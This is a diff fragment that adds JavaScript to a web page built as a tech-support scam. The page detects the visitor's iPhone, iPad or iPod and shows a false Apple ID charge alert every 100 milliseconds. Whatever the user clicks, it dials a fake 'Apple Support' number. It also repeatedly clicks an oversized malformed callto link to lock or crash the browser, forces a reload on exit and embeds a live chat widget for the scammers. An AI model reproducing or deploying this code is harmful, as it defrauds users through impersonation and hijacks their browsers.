+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-481-2925"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-877-481-2925 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
